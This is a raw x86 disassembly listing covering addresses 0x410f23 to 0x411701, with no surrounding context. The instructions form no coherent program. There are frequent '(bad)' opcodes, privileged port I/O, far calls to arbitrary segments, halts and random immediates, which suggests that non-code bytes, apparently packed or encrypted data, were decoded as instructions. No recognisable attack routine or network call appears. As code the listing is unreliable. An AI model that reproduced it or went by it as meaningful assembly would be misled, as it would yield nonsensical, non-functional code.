  410f23:	ss pop ss
  410f25:	jp     0x410f26
  410f27:	pop    edx
  410f28:	sub    bl,al
  410f2a:	pop    ds
  410f2b:	scas   eax,DWORD PTR es:[edi]
  410f2c:	js     0x410eea
  410f2e:	inc    ebx
  410f2f:	mov    esi,0xbb75062e
  410f34:	cli    
  410f35:	xor    eax,0xd82f562d
  410f3a:	dec    esi
  410f3b:	and    al,0x93
  410f3d:	sub    DWORD PTR [eax-0x5347ac60],edi
  410f43:	push   esp
  410f44:	cdq    
  410f45:	out    dx,al
  410f46:	out    0xd0,eax
  410f48:	mov    dh,BYTE PTR [edx-0x200dad1e]
  410f4e:	xor    al,al
  410f50:	inc    edx
  410f51:	sar    DWORD PTR [ebx+edi*8],0x3
  410f55:	(bad)  
  410f56:	push   ebx
  410f57:	loop   0x410f60
  410f59:	popf   
  410f5a:	enter  0x4721,0xc7
  410f5e:	sub    BYTE PTR [ebp-0x3129729c],al
  410f64:	dec    edi
  410f65:	addr16 aas 
  410f67:	mov    eax,DWORD PTR [edx]
  410f69:	pushf  
  410f6a:	mov    eax,0xbb1a28c1
  410f6f:	ret    
  410f70:	jne    0x410f5f
  410f72:	xchg   BYTE PTR [ebx+0x30],bh
  410f75:	loopne 0x410fd5
  410f77:	lods   eax,DWORD PTR ds:[esi]
  410f78:	xor    BYTE PTR [ebp-0x7091bd9a],ch
  410f7e:	fsub   st,st(5)
  410f80:	mov    ecx,0x164658e0
  410f85:	pop    eax
  410f86:	in     al,dx
  410f87:	(bad)  [edi]
  410f89:	(bad)  
  410f8a:	xor    ebp,DWORD PTR [esi-0x70]
  410f8d:	jle    0x410f73
  410f8f:	call   0xdc343019
  410f94:	loop   0x410fa6
  410f96:	jns    0x410f55
  410f98:	jno    0x411015
  410f9a:	retf   0xfa70
  410f9d:	loope  0x410f97
  410f9f:	fadd   DWORD PTR [esi+0x1a]
  410fa2:	rcr    BYTE PTR [edx],cl
  410fa4:	inc    ecx
  410fa5:	dec    eax
  410fa6:	jle    0x410fd1
  410fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa9:	sub    BYTE PTR [edx+0x50],ah
  410fac:	and    DWORD PTR [ebx+ebx*1+0x59],edx
  410fb0:	das    
  410fb1:	das    
  410fb2:	inc    DWORD PTR [esi]
  410fb4:	and    esp,DWORD PTR [edi-0x7e18bee7]
  410fba:	xchg   BYTE PTR [eax+0x66ee0f5b],cl
  410fc0:	mov    esp,0xe2a2471d
  410fc5:	fstp   TBYTE PTR [ebp+0x4f]
  410fc8:	cmp    bl,BYTE PTR [ebx]
  410fca:	arpl   si,sp
  410fcc:	sub    bl,BYTE PTR [ebp+ecx*2-0x11]
  410fd0:	xor    al,ah
  410fd2:	(bad)  [edi]
  410fd4:	cmp    BYTE PTR [esi],bh
  410fd6:	nop
  410fd7:	add    al,0x3c
  410fd9:	outs   dx,BYTE PTR ds:[esi]
  410fda:	arpl   WORD PTR [edi+0x4b],cx
  410fdd:	cdq    
  410fde:	iret   
  410fdf:	inc    ebp
  410fe0:	jb     0x411043
  410fe2:	test   edx,edi
  410fe4:	inc    edx
  410fe5:	or     DWORD PTR [esi+0x6792b2b4],0x21
  410fec:	push   edi
  410fed:	add    ch,ch
  410fef:	ret    
  410ff0:	push   edx
  410ff1:	sub    cl,bh
  410ff3:	xor    DWORD PTR [ecx],ebp
  410ff5:	es pop edi
  410ff7:	sbb    cl,al
  410ff9:	sti    
  410ffa:	xchg   cl,dl
  410ffc:	mov    dh,BYTE PTR [ebx]
  410ffe:	jb     0x410fa0
  411000:	icebp  
  411001:	adc    ebp,DWORD PTR [edx+0x77eacecf]
  411007:	inc    esp
  411008:	push   0xf701ebbe
  41100d:	iret   
  41100e:	aad    0x9e
  411010:	in     al,dx
  411011:	mov    ds:0xf30ed907,al
  411016:	sahf   
  411017:	jl     0x410fb0
  411019:	sbb    DWORD PTR [esi+0xa],ebp
  41101c:	std    
  41101d:	lea    edx,[ecx+0x139288bb]
  411023:	aad    0x6f
  411025:	inc    esp
  411026:	jae    0x410fc9
  411028:	jle    0x41107d
  41102a:	ds ins BYTE PTR es:[edi],dx
  41102c:	fdivr  QWORD PTR [eax]
  41102e:	mov    DWORD PTR [edx],edx
  411030:	jge    0x411034
  411032:	jo     0x41102f
  411034:	add    al,0x1f
  411036:	imul   ebp,DWORD PTR [esi+eax*1],0xffffffa7
  41103a:	adc    BYTE PTR [ebx+0x3d],ah
  41103d:	sbb    ch,BYTE PTR [ebp+eax*1-0x66bd5c25]
  411044:	ss jno 0x411059
  411047:	adc    dh,BYTE PTR [ebp+0x526c2afd]
  41104d:	mov    dl,0x9b
  41104f:	rol    DWORD PTR [edi-0x24c7e1fd],0xd8
  411056:	jmp    FWORD PTR [ebp+0x28a4e2c7]
  41105c:	mov    dl,0xcb
  41105e:	adc    dh,BYTE PTR [ebx]
  411060:	imul   BYTE PTR [edi-0x3a5e7fbb]
  411066:	stos   DWORD PTR es:[edi],eax
  411067:	jbe    0x411060
  411069:	inc    edx
  41106a:	pop    edi
  41106b:	(bad)  
  41106c:	shl    ebx,cl
  41106e:	test   BYTE PTR [ebp+0x3],ah
  411071:	xchg   BYTE PTR [esi-0x2f5a8e21],bl
  411077:	enter  0xdfa3,0x4a
  41107b:	cmp    DWORD PTR [eax+0x6d],edx
  41107e:	test   BYTE PTR [ecx-0x71665a9e],ah
  411084:	jne    0x41105a
  411086:	mov    cl,al
  411088:	xchg   ah,dh
  41108a:	inc    eax
  41108b:	sti    
  41108c:	pop    edi
  41108d:	ins    BYTE PTR es:[edi],dx
  41108e:	or     ecx,ebp
  411090:	in     eax,0xec
  411092:	inc    eax
  411093:	mov    BYTE PTR [ecx-0x3c],al
  411096:	or     al,0x54
  411098:	add    bh,BYTE PTR [esi+0x3677d5f7]
  41109e:	icebp  
  41109f:	push   ecx
  4110a0:	dec    edx
  4110a1:	lds    ebx,FWORD PTR [edi+edx*8]
  4110a4:	jns    0x41102c
  4110a6:	repz fucomp st(3)
  4110a9:	call   0x2455:0x79d1be8e
  4110b0:	cli    
  4110b1:	adc    esi,DWORD PTR [ebp+0x45]
  4110b4:	cs test al,0x6
  4110b7:	(bad)  
  4110b8:	push   0xe2e5de11
  4110bd:	adc    ch,bl
  4110bf:	inc    ebp
  4110c0:	dec    esi
  4110c1:	xor    edx,DWORD PTR ds:0xe30a4e47
  4110c7:	push   ecx
  4110c8:	outs   dx,DWORD PTR ds:[esi]
  4110c9:	or     BYTE PTR [esi],dh
  4110cb:	frstor [eax-0x7c]
  4110ce:	pop    es
  4110cf:	sti    
  4110d0:	add    ebx,edi
  4110d2:	mov    al,0xe3
  4110d4:	adc    ebp,edx
  4110d6:	pop    ebx
  4110d7:	hlt    
  4110d8:	fwait
  4110d9:	xor    al,BYTE PTR [ebx-0x3194d85c]
  4110df:	xchg   BYTE PTR ds:0x8b49a383,bl
  4110e5:	mov    dh,0xc
  4110e7:	stc    
  4110e8:	stos   BYTE PTR es:[edi],al
  4110e9:	or     DWORD PTR [eax+ebx*1-0xe77c5fe],esp
  4110f0:	dec    esp
  4110f1:	jb     0x4110b9
  4110f3:	(bad)  
  4110f4:	mov    eax,0x331a5cf8
  4110f9:	mov    eax,0x376a65f0
  4110fe:	lds    ebp,FWORD PTR [esi]
  411100:	aad    0x70
  411102:	jecxz  0x41113d
  411104:	retf   0xd976
  411107:	ror    DWORD PTR [edi-0x12c81a88],0x10
  41110e:	gs pop eax
  411110:	push   eax
  411111:	inc    esi
  411112:	mov    edi,DWORD PTR [ecx+ecx*1]
  411115:	cmp    DWORD PTR [edi+0x5c337a84],0x10
  41111c:	std    
  41111d:	lfs    edi,FWORD PTR [edx]
  411120:	clc    
  411121:	jnp    0x4110f9
  411123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411124:	push   ebx
  411125:	rol    ebx,1
  411127:	loope  0x4110cb
  411129:	xor    dl,bh
  41112b:	clc    
  41112c:	icebp  
  41112d:	je     0x411133
  41112f:	mov    bh,0x98
  411131:	daa    
  411132:	xor    dh,BYTE PTR [ecx+0xa]
  411135:	outs   dx,DWORD PTR ds:[esi]
  411136:	xor    ebp,esp
  411138:	jmp    0x332:0x6b170293
  41113f:	imul   DWORD PTR cs:[eax]
  411142:	stc    
  411143:	sbb    eax,0x364b06fe
  411148:	test   BYTE PTR [eax-0x155b70e7],al
  41114e:	test   al,0x5a
  411150:	pop    ecx
  411151:	jb     0x4110ef
  411153:	ret    
  411154:	fcmovu st,st(6)
  411156:	retf   0x596c
  411159:	out    0x9c,eax
  41115b:	cli    
  41115c:	hlt    
  41115d:	in     eax,0x1e
  41115f:	cmc    
  411160:	cmp    eax,DWORD PTR es:[ebx+eiz*4-0x1645c09c]
  411168:	lods   al,BYTE PTR ds:[esi]
  411169:	arpl   WORD PTR [ebp+0x66],sp
  41116c:	cmp    esi,DWORD PTR [ecx-0x4]
  41116f:	mov    edi,0xbaa5125
  411174:	jmp    FWORD PTR [edx]
  411176:	call   0x615c2bbc
  41117b:	ret    
  41117c:	push   ss
  41117d:	hlt    
  41117e:	and    eax,0x8fa5c6e5
  411183:	jle    0x4111e3
  411185:	and    al,0x53
  411187:	mov    edi,DWORD PTR [esi]
  411189:	repz test BYTE PTR [ebx-0x4036e07e],ah
  411190:	test   BYTE PTR [esp+eax*4-0x717fc6a9],dh
  411197:	jb     0x411142
  411199:	jb     0x411139
  41119b:	call   0x303d:0x9b4e175b
  4111a2:	dec    edi
  4111a3:	sbb    dl,ch
  4111a5:	ss (bad) 
  4111a7:	push   0xffffff93
  4111a9:	and    bl,dh
  4111ab:	data16 mov cl,0x50
  4111ae:	fild   QWORD PTR [esi]
  4111b0:	cli    
  4111b1:	fbld   TBYTE PTR [eax]
  4111b3:	retf   0xc759
  4111b6:	xor    DWORD PTR [ebx-0x3],ebx
  4111b9:	or     eax,0xe02081a4
  4111be:	dec    ecx
  4111bf:	inc    esp
  4111c0:	jne    0x4111e4
  4111c2:	rcr    DWORD PTR ds:0x7258d44c,1
  4111c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c9:	jne    0x411195
  4111cb:	sbb    al,0xa1
  4111cd:	in     al,0xc2
  4111cf:	inc    esi
  4111d0:	out    0xdc,al
  4111d2:	push   0xffffffeb
  4111d4:	jge    0x41116f
  4111d6:	adc    dh,BYTE PTR [edx+0x5d]
  4111d9:	xchg   DWORD PTR [ebx+0x7c],ecx
  4111dc:	les    ecx,FWORD PTR [bp+si]
  4111df:	cmp    eax,0x5f49122c
  4111e4:	jp     0x4111bc
  4111e6:	adc    eax,DWORD PTR [edx+0x1d15199a]
  4111ec:	push   ebx
  4111ed:	arpl   cx,si
  4111ef:	jnp    0x411198
  4111f1:	aam    0xf2
  4111f3:	inc    esp
  4111f4:	xchg   edi,eax
  4111f5:	daa    
  4111f6:	into   
  4111f7:	sbb    al,BYTE PTR [ecx-0x73]
  4111fa:	rcl    BYTE PTR [eax],cl
  4111fc:	mov    bh,BYTE PTR [eax+eax*2]
  4111ff:	mov    cl,BYTE PTR [ebx-0x2de39154]
  411205:	call   0xa36e1900
  41120a:	imul   DWORD PTR [esi-0x659b6af]
  411210:	adc    BYTE PTR [ecx],ah
  411212:	(bad)  
  411213:	repz add bl,cl
  411216:	sub    eax,0x46439ffa
  41121b:	loopne 0x4111b2
  41121d:	mov    esp,DWORD PTR [ecx-0x5fb96939]
  411223:	mov    edx,0xd6f286ab
  411228:	xor    DWORD PTR [eax+0x4a161d4c],ebp
  41122e:	aaa    
  41122f:	xchg   esp,eax
  411230:	cmp    edi,esp
  411232:	int    0x9
  411234:	loope  0x411235
  411236:	inc    ebp
  411237:	mov    edi,0x848d303c
  41123c:	xchg   ecx,eax
  41123d:	(bad)  [eax+0x280108ba]
  411243:	out    dx,al
  411244:	inc    eax
  411245:	sbb    edi,DWORD PTR [edi+0xb]
  411248:	dec    eax
  411249:	mov    dl,0x2c
  41124b:	shl    BYTE PTR [edi],cl
  41124d:	adc    DWORD PTR [esi-0x69],ebx
  411250:	pop    ecx
  411251:	push   esp
  411252:	dec    ebx
  411253:	repz xlat BYTE PTR ds:[ebx]
  411255:	aaa    
  411256:	into   
  411257:	add    al,0x14
  411259:	test   bh,bh
  41125b:	dec    ecx
  41125c:	sbb    al,0x52
  41125e:	jb     0x4112c9
  411260:	loopne 0x4112b4
  411262:	pop    es
  411263:	push   eax
  411264:	jg     0x411290
  411266:	daa    
  411267:	test   eax,0x8a701f53
  41126c:	mov    eax,0xa54fc155
  411271:	or     BYTE PTR [ebx-0xddcb726],bl
  411277:	call   FWORD PTR [ebx+0x471ac1d9]
  41127d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41127e:	sbb    DWORD PTR fs:[ebx],ebp
  411281:	adc    ecx,eax
  411283:	iret   
  411284:	test   al,0xf
  411286:	push   ebp
  411287:	aad    0x1
  411289:	adc    DWORD PTR [edx],esp
  41128b:	inc    edx
  41128c:	jae    0x4112fb
  41128e:	jbe    0x411230
  411290:	inc    edi
  411291:	push   esi
  411292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411293:	(bad)  
  411294:	mov    eax,ds:0xa9c10448
  411299:	add    esp,DWORD PTR [edi]
  41129b:	mov    al,ds:0xe378a27
  4112a0:	and    cl,0xb6
  4112a3:	xchg   DWORD PTR [edi],esp
  4112a5:	mov    dl,0x2
  4112a7:	dec    eax
  4112a8:	inc    esi
  4112a9:	xor    ch,bl
  4112ab:	je     0x41130b
  4112ad:	ins    DWORD PTR es:[edi],dx
  4112ae:	sbb    dh,al
  4112b0:	out    0xdd,al
  4112b2:	pop    esi
  4112b3:	repz or eax,0xfd75b4cc
  4112b9:	(bad)  
  4112ba:	mov    esi,0xac0a394a
  4112bf:	inc    ebp
  4112c0:	call   0x78a42f8e
  4112c5:	mov    al,bl
  4112c7:	lods   eax,DWORD PTR ds:[esi]
  4112c8:	pusha  
  4112c9:	loop   0x4112af
  4112cb:	mov    dl,0xc9
  4112cd:	xchg   ebp,eax
  4112ce:	dec    esi
  4112cf:	adc    al,BYTE PTR [ecx+0x21419128]
  4112d5:	enter  0xadfd,0x9
  4112d9:	push   es
  4112da:	adc    BYTE PTR [edx],0x2b
  4112dd:	pop    esi
  4112de:	fwait
  4112df:	mov    DWORD PTR [esi+ebx*2-0x8],esi
  4112e3:	dec    edx
  4112e4:	xchg   esp,eax
  4112e5:	dec    edi
  4112e6:	sbb    ebx,DWORD PTR [ebp+0x7fdff77a]
  4112ec:	mov    dl,0xa9
  4112ee:	mov    ecx,0x803f05d5
  4112f3:	mov    eax,0xfa1ce530
  4112f8:	push   ecx
  4112f9:	add    BYTE PTR [ebx-0x41662184],ah
  4112ff:	mov    esp,0xb2739b3e
  411304:	ins    DWORD PTR es:[edi],dx
  411305:	adc    al,0xdd
  411307:	mov    al,0x32
  411309:	fadd   DWORD PTR [ecx+0x30037964]
  41130f:	mov    eax,0xf4247ea0
  411314:	mov    dh,0xf4
  411316:	xor    al,0x29
  411318:	mov    esp,ecx
  41131a:	sub    bh,ch
  41131c:	sbb    DWORD PTR [edi],ebx
  41131e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41131f:	mov    ecx,0x4ab7fec4
  411324:	lea    edx,[ebp-0x7de74f6e]
  41132a:	(bad)  
  41132b:	loop   0x411387
  41132d:	pop    ss
  41132e:	js     0x41138f
  411330:	xchg   esp,eax
  411331:	fadd   QWORD PTR [ebx+0x1114aa5a]
  411337:	jecxz  0x411389
  411339:	mov    esp,ss
  41133b:	shl    bh,1
  41133d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133e:	sub    cl,BYTE PTR [ebx+0x637d968]
  411344:	add    al,0x3b
  411346:	cmp    ah,BYTE PTR [eax]
  411348:	test   ah,ch
  41134a:	shl    BYTE PTR [eax-0xe],1
  41134d:	out    dx,eax
  41134e:	in     al,dx
  41134f:	xchg   ecx,eax
  411350:	xchg   esp,eax
  411351:	retf   0x7d8f
  411354:	lods   al,BYTE PTR ds:[esi]
  411355:	jae    0x4113c0
  411357:	mov    al,ds:0x574073e0
  41135c:	imul   ecx,esp,0x14ec1f3f
  411362:	out    dx,eax
  411363:	(bad)  
  411365:	adc    DWORD PTR [ebp-0x3e912df3],esi
  41136b:	pop    ds
  41136c:	adc    cl,BYTE PTR [edi]
  41136e:	call   DWORD PTR [edx+0x3aa84aa2]
  411374:	or     eax,0x1f6eaed
  411379:	or     eax,DWORD PTR [ebx-0x49d792ee]
  41137f:	leave  
  411380:	cdq    
  411381:	mov    eax,ds:0x84f2de1a
  411387:	xor    al,0x6a
  411389:	sub    al,0x2
  41138b:	add    BYTE PTR [edi-0x861794c],ch
  411391:	xchg   edi,eax
  411392:	pop    edx
  411393:	mov    BYTE PTR [eax],bh
  411395:	mov    al,ds:0xcc1938ab
  41139a:	jb     0x41141a
  41139c:	sbb    BYTE PTR [ebx+edi*1+0x3a],bh
  4113a0:	pop    esp
  4113a1:	xlat   BYTE PTR ds:[ebx]
  4113a2:	cld    
  4113a3:	push   ecx
  4113a4:	dec    esi
  4113a5:	or     eax,0x9591f6bd
  4113aa:	popa   
  4113ab:	add    eax,0xe370999c
  4113b0:	aas    
  4113b1:	jge    0x411344
  4113b3:	rol    dl,1
  4113b5:	dec    edx
  4113b6:	hlt    
  4113b7:	xor    BYTE PTR [ebx-0x17edeb7e],0xfc
  4113be:	fist   WORD PTR [ebx]
  4113c0:	sti    
  4113c1:	ins    BYTE PTR es:[edi],dx
  4113c2:	cld    
  4113c3:	test   al,0x34
  4113c5:	clc    
  4113c6:	or     eax,0x11d93dda
  4113cb:	mov    edx,0xca127280
  4113d0:	xlat   BYTE PTR ds:[ebx]
  4113d1:	(bad)  
  4113d2:	(bad)  
  4113d3:	mov    ebp,0x418b256
  4113d8:	jns    0x411427
  4113da:	xchg   edi,eax
  4113db:	das    
  4113dc:	dec    eax
  4113dd:	dec    ebp
  4113de:	std    
  4113df:	(bad)  
  4113e0:	es sub ebp,ebp
  4113e3:	and    al,0xa1
  4113e5:	bound  edx,QWORD PTR [esi-0x6445c460]
  4113eb:	in     eax,dx
  4113ec:	call   edi
  4113ee:	mov    edx,0xb74d5eaa
  4113f3:	pop    edi
  4113f4:	cmp    dl,cl
  4113f6:	jns    0x411422
  4113f8:	fdivr  QWORD PTR [edx]
  4113fa:	imul   esi,DWORD PTR [ecx-0x71],0xc0353627
  411401:	pop    es
  411402:	jns    0x4113b8
  411404:	test   DWORD PTR [edx],ecx
  411406:	aam    0xfe
  411408:	adc    ah,BYTE PTR [esi]
  41140a:	and    BYTE PTR [esi+0x7],0x68
  41140e:	not    BYTE PTR [edi-0x186d6355]
  411414:	xor    al,0x94
  411416:	cwde   
  411417:	jmp    0x1628:0xb2db015
  41141e:	xchg   BYTE PTR [eax+0x11b839fa],ah
  411424:	xchg   ah,dh
  411426:	repz mov ah,0x17
  411429:	test   BYTE PTR [eax-0x3d],cl
  41142c:	ret    
  41142d:	adc    DWORD PTR [ecx+0x2e],edi
  411430:	push   ss
  411431:	adc    eax,0x4d3fe572
  411436:	mov    edx,0x7bc34a8e
  41143b:	jno    0x41144f
  41143d:	mov    al,0x72
  41143f:	jg     0x41144e
  411441:	call   0x29f1:0xa9a5e365
  411448:	cmp    ebp,ebp
  41144a:	jo     0x4114a1
  41144c:	iret   
  41144d:	push   esp
  41144e:	ja     0x41147d
  411450:	ja     0x41140c
  411452:	inc    ecx
  411453:	ret    
  411454:	fs cli 
  411456:	(bad)  
  411457:	xor    BYTE PTR [edi-0x37e66f6e],ah
  41145d:	jcxz   0x411446
  411460:	sbb    DWORD PTR [eax-0x2e6d4525],edx
  411466:	sub    eax,0x563ff0ca
  41146b:	xchg   cl,bh
  41146d:	fcomip st,st(6)
  41146f:	push   edx
  411470:	cld    
  411471:	cmp    esp,DWORD PTR [ebx]
  411473:	rcl    BYTE PTR [ecx-0x2f],0xcf
  411477:	stc    
  411478:	dec    ecx
  411479:	das    
  41147a:	jmp    0x4114b8
  41147c:	adc    dh,bl
  41147e:	pop    edx
  41147f:	jg     0x4114d4
  411481:	jbe    0x411411
  411483:	xchg   edx,eax
  411484:	nop
  411485:	jns    0x411463
  411487:	mov    dh,BYTE PTR [esi+ecx*1-0xd]
  41148b:	jp     0x41140d
  41148d:	fstp   TBYTE PTR ds:0xd95d9e72
  411493:	mov    ?,edi
  411495:	mov    ecx,0x83fc7765
  41149a:	int3   
  41149b:	pop    es
  41149c:	les    eax,FWORD PTR [edx+0x3c700fa7]
  4114a2:	and    eax,0x81196593
  4114a7:	inc    esi
  4114a8:	or     DWORD PTR [ebx],esp
  4114aa:	mul    BYTE PTR [ebp-0x7b]
  4114ad:	jmp    0xb8dd:0xe780d783
  4114b4:	xor    eax,0xfe12f445
  4114b9:	bound  esp,QWORD PTR [edi+0x1b67c2ce]
  4114bf:	test   DWORD PTR [edx-0x626a2f0a],0xd2b02091
  4114c9:	xchg   ecx,eax
  4114ca:	aad    0xf
  4114cc:	push   ss
  4114cd:	pop    edx
  4114ce:	push   0x7af4291e
  4114d3:	lea    edi,[eax]
  4114d5:	or     dh,ch
  4114d7:	xor    DWORD PTR [esi+0x34],ecx
  4114da:	rol    BYTE PTR [edi-0xe893836],1
  4114e0:	popa   
  4114e1:	test   cl,0x2c
  4114e4:	inc    edi
  4114e5:	mov    bh,0xac
  4114e7:	sbb    dh,BYTE PTR [ecx+0x802cabf]
  4114ed:	mov    eax,0xd0908efc
  4114f2:	inc    esi
  4114f3:	out    0x32,al
  4114f5:	inc    ebx
  4114f6:	scas   eax,DWORD PTR es:[edi]
  4114f7:	shl    esi,0x8c
  4114fa:	and    DWORD PTR [edi+0x64],edi
  4114fd:	ja     0x411562
  4114ff:	pop    esp
  411500:	mov    ah,0x89
  411502:	xor    bl,BYTE PTR [eax]
  411504:	int    0xe6
  411506:	ss in  al,0xee
  411509:	outs   dx,DWORD PTR ds:[esi]
  41150a:	jns    0x411559
  41150c:	sub    edi,eax
  41150e:	out    dx,al
  41150f:	jecxz  0x41155b
  411511:	pop    eax
  411512:	sahf   
  411513:	xchg   edx,eax
  411514:	push   edx
  411515:	ss retf 0x20a3
  411519:	call   0x543519b0
  41151e:	jb     0x4114fe
  411520:	sbb    edi,eax
  411522:	aad    0x82
  411524:	call   0x4457:0x235b5f55
  41152b:	mov    esi,0xd6f34edc
  411530:	fild   WORD PTR [eax]
  411532:	jb     0x411573
  411534:	pushf  
  411535:	sbb    bh,dl
  411537:	xchg   ecx,eax
  411538:	pop    ds
  411539:	adc    eax,0x5fe4259
  41153e:	inc    edx
  41153f:	iret   
  411540:	and    ecx,DWORD PTR [edi-0xefa496a]
  411546:	fwait
  411547:	mov    dh,0xb1
  411549:	lods   eax,DWORD PTR ds:[esi]
  41154a:	and    esp,DWORD PTR [ecx+eiz*1-0x2]
  41154e:	je     0x411585
  411550:	pop    es
  411551:	push   esi
  411552:	mov    al,BYTE PTR ds:0x419964d9
  411558:	and    dl,bh
  41155a:	call   0xf53f:0xa8d4f67c
  411561:	mov    ebp,0x643fddfb
  411566:	cld    
  411567:	ror    BYTE PTR [ebp-0x1b],cl
  41156a:	pop    esi
  41156b:	sub    ah,BYTE PTR [edx]
  41156d:	and    al,0x7b
  41156f:	push   ds
  411570:	add    ecx,ebx
  411572:	mov    ebx,0xe7e100a7
  411577:	mov    DWORD PTR [edi+esi*8],ebx
  41157a:	fstp   DWORD PTR [esi+0x2f]
  41157d:	test   al,0x93
  41157f:	fdivr  DWORD PTR [edx]
  411581:	ret    
  411582:	call   0x30923da0
  411587:	dec    edi
  411588:	xcrypt-cbc (bad)
  411589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41158a:	xchg   ebx,eax
  41158b:	mov    ebx,DWORD PTR [ecx-0x68a5e839]
  411591:	push   edx
  411592:	ret    
  411593:	lea    eax,[ecx+esi*2]
  411596:	gs lahf 
  411598:	mov    esi,0x130f30db
  41159d:	mov    edx,es
  41159f:	sub    al,0x98
  4115a1:	sub    eax,0x96835e60
  4115a6:	imul   ebp,DWORD PTR [eax+0x2945776e],0x228172b6
  4115b0:	das    
  4115b1:	out    dx,al
  4115b2:	lock xchg edi,eax
  4115b4:	push   es
  4115b5:	pop    eax
  4115b6:	retf   
  4115b7:	hlt    
  4115b8:	gs ret 
  4115ba:	les    esi,FWORD PTR [ecx]
  4115bc:	fisubr DWORD PTR [eax-0x71f829b6]
  4115c2:	pop    edx
  4115c3:	mov    ds:0x1dd3ba89,eax
  4115c8:	jae    0x411616
  4115ca:	sub    ebx,esp
  4115cc:	clc    
  4115cd:	pop    eax
  4115ce:	jbe    0x411625
  4115d0:	adc    dl,BYTE PTR [ebx-0x6e801486]
  4115d6:	dec    edx
  4115d7:	in     al,0x6a
  4115d9:	cmp    edx,DWORD PTR [ebp+0x5d]
  4115dc:	adc    BYTE PTR [eax-0x32],0x66
  4115e0:	hlt    
  4115e1:	dec    esp
  4115e2:	scas   eax,DWORD PTR es:[edi]
  4115e3:	xor    al,ch
  4115e5:	fstp   DWORD PTR [eax+eiz*1]
  4115e8:	popa   
  4115e9:	lahf   
  4115ea:	and    DWORD PTR [edx-0x6eb7831d],esp
  4115f0:	(bad)  
  4115f2:	cmp    cl,BYTE PTR [edx]
  4115f4:	sbb    ah,ah
  4115f6:	xor    BYTE PTR [ebx],cl
  4115f8:	cmp    al,0xbc
  4115fa:	sahf   
  4115fb:	mov    DWORD PTR [ebx],ebx
  4115fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115fe:	hlt    
  4115ff:	jae    0x4115bf
  411601:	shl    BYTE PTR [edi-0x50],cl
  411604:	iret   
  411605:	inc    esi
  411606:	imul   esi,DWORD PTR [ebx-0x77],0x7b1e37de
  41160d:	jne    0x41168c
  41160f:	test   al,0x1a
  411611:	dec    esp
  411612:	mov    ebx,ds
  411614:	adc    DWORD PTR [ebp-0x121fb2da],eax
  41161a:	outs   dx,BYTE PTR ds:[esi]
  41161b:	cdq    
  41161c:	xlat   BYTE PTR ds:[ebx]
  41161d:	mov    bl,0x74
  41161f:	jge    0x4115a2
  411621:	out    dx,al
  411622:	pop    ebx
  411623:	mov    eax,0xe23338fb
  411628:	xchg   edx,ecx
  41162a:	jp     0x4115f1
  41162c:	inc    esp
  41162d:	adc    DWORD PTR [esi],ecx
  41162f:	push   ss
  411630:	adc    eax,0xe1297604
  411635:	mov    ds:0x78f3b759,eax
  41163a:	mov    BYTE PTR [esi+0x4f],ch
  41163d:	fild   WORD PTR [eax]
  41163f:	dec    edx
  411640:	or     ecx,DWORD PTR [esp+edi*8-0x14]
  411644:	jle    0x411611
  411646:	pop    ebx
  411647:	pop    ds
  411648:	mov    bh,BYTE PTR [ebx-0x3c]
  41164b:	test   DWORD PTR [ebx],esp
  41164d:	imul   ebx,DWORD PTR ss:[ebx],0x35
  411651:	push   ss
  411652:	lock aas 
  411654:	jmp    0x750465fb
  411659:	add    al,0x45
  41165b:	sbb    al,BYTE PTR [ecx+0x438b6d7c]
  411661:	push   cs
  411662:	xchg   edi,eax
  411663:	xor    edx,ebx
  411665:	call   0x6bb:0x3309f143
  41166c:	jp     0x4116c9
  41166e:	mov    ah,0xac
  411670:	mov    dl,0x5e
  411672:	mov    ds:0x26abd3f8,al
  411677:	pop    edx
  411678:	lods   al,BYTE PTR ds:[esi]
  411679:	jne    0x4116f0
  41167b:	leave  
  41167c:	retf   
  41167d:	not    BYTE PTR [ebx+0x157b3bf7]
  411683:	cld    
  411684:	xor    al,0xa3
  411686:	in     al,dx
  411687:	pop    ecx
  411688:	sar    BYTE PTR [esi+0x21],cl
  41168b:	push   ds
  41168c:	and    edx,ecx
  41168e:	dec    ecx
  41168f:	fcmovbe st,st(2)
  411691:	push   edx
  411692:	call   0x1841:0xcbf9aec1
  411699:	out    dx,al
  41169a:	jbe    0x411623
  41169c:	fcomp  QWORD PTR [edi-0x22]
  41169f:	stos   DWORD PTR es:[edi],eax
  4116a0:	sti    
  4116a1:	test   DWORD PTR ds:0x79338957,edi
  4116a7:	stos   DWORD PTR es:[edi],eax
  4116a8:	fs das 
  4116aa:	inc    ecx
  4116ab:	adc    edx,DWORD PTR [eax]
  4116ad:	(bad)  
  4116ae:	cwde   
  4116af:	push   esp
  4116b0:	arpl   bx,bp
  4116b2:	xchg   esp,eax
  4116b3:	in     al,dx
  4116b4:	fcmove st,st(4)
  4116b6:	popf   
  4116b7:	sbb    al,0xa3
  4116b9:	add    al,0xae
  4116bb:	leave  
  4116bc:	dec    ebx
  4116bd:	inc    ecx
  4116be:	adc    al,0x6f
  4116c0:	repz mov al,0xc1
  4116c3:	mov    dh,0xae
  4116c5:	shr    bl,1
  4116c7:	stos   DWORD PTR es:[edi],eax
  4116c8:	inc    ecx
  4116c9:	test   eax,0x8964de3c
  4116ce:	cmp    bl,BYTE PTR [edx-0x436d4613]
  4116d4:	repz dec ebp
  4116d6:	popf   
  4116d7:	dec    esp
  4116d8:	adc    dl,0x8c
  4116db:	adc    al,0x4b
  4116dd:	(bad)  
  4116de:	in     eax,dx
  4116df:	sub    DWORD PTR [edi],ecx
  4116e1:	cmp    bh,0x9f
  4116e4:	arpl   sp,bx
  4116e6:	sbb    bh,BYTE PTR [edx+eiz*4]
  4116e9:	das    
  4116ea:	in     eax,dx
  4116eb:	inc    esi
  4116ec:	out    0x49,eax
  4116ee:	out    0x60,al
  4116f0:	imul   edx,DWORD PTR ss:[edx*4+0x51ee8fcb],0xb69591b6
  4116fc:	pop    ecx
  4116fd:	ret    0xaab
  411700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411701:	mov    BYTE PTR [ecx-0x3a],0x5b
